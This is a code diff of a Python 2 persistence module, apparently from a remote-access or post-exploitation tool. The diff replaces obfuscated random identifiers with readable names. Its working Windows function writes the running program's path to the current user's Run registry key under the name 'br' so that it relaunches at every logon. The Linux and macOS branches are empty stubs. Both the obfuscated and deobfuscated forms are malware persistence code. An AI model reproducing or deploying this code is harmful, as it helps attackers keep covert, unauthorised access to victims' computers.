@@ -1,32 +1,32 @@
 # -*- coding: utf-8 -*-
 import sys
-def JZjNpUnETUJrnOtJucnIbTcmBTRjKEbG():
+def windows_persistence():
     import _winreg
     from _winreg import HKEY_CURRENT_USER as HKCU
-    IaqFykPaTvrndCcdwYjXphjNhzzrHCpq = r'Software\Microsoft\Windows\CurrentVersion\Run'
-    HZwfUUwUcdLYkgZhWYYFESDrVJfwPfUv = sys.executable
+    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    bin_path = sys.executable
     try:
-        SCTheZDdPbWCDfSRtlmTRIgFkflcOLkb = _winreg.OpenKey(HKCU, IaqFykPaTvrndCcdwYjXphjNhzzrHCpq, 0, _winreg.KEY_WRITE)
-        _winreg.SetValueEx(SCTheZDdPbWCDfSRtlmTRIgFkflcOLkb, 'br', 0, _winreg.REG_SZ, HZwfUUwUcdLYkgZhWYYFESDrVJfwPfUv)
-        _winreg.CloseKey(SCTheZDdPbWCDfSRtlmTRIgFkflcOLkb)
+        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
+        _winreg.SetValueEx(reg_key, 'br', 0, _winreg.REG_SZ, bin_path)
+        _winreg.CloseKey(reg_key)
         return True, 'HKCU Run registry key applied'
     except WindowsError:
         return False, 'HKCU Run registry key failed'
-def eNuQLcwblRkMgmgKfCBAHEPSONeRSChG():
+def linux_persistence():
     return False, 'nothing here yet'
-def UNProeYqWpAoJSywSlEmZafEghKSpCKo():
+def mac_persistence():
     return False, 'nothing here yet'
-def KSPHuMocsXbfrKZwRqaErcEfeKhnQFFv(plat_type):
+def run(plat_type):
     if plat_type.startswith('win'):
-        DnOzaeycHfRcHnadlVHzEZNTVgZWQkpY, tJUeinFFADlCvNgIGJTySwKOoKVIHchg = JZjNpUnETUJrnOtJucnIbTcmBTRjKEbG()
+        success, details = windows_persistence()
     elif plat_type.startswith('linux'):
-        DnOzaeycHfRcHnadlVHzEZNTVgZWQkpY, tJUeinFFADlCvNgIGJTySwKOoKVIHchg = eNuQLcwblRkMgmgKfCBAHEPSONeRSChG()
+        success, details = linux_persistence()
     elif plat_type.startswith('darwin'):
-        DnOzaeycHfRcHnadlVHzEZNTVgZWQkpY, tJUeinFFADlCvNgIGJTySwKOoKVIHchg = UNProeYqWpAoJSywSlEmZafEghKSpCKo()
+        success, details = mac_persistence()
     else:
         return 'Error, platform unsupported.'
-    if DnOzaeycHfRcHnadlVHzEZNTVgZWQkpY:
-        hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt = 'Persistence successful, {}.'.format(tJUeinFFADlCvNgIGJTySwKOoKVIHchg)
+    if success:
+        results = 'Persistence successful, {}.'.format(details)
     else:
-        hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt = 'Persistence unsuccessful, {}.'.format(tJUeinFFADlCvNgIGJTySwKOoKVIHchg)
-    return hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt
+        results = 'Persistence unsuccessful, {}.'.format(details)
+    return results
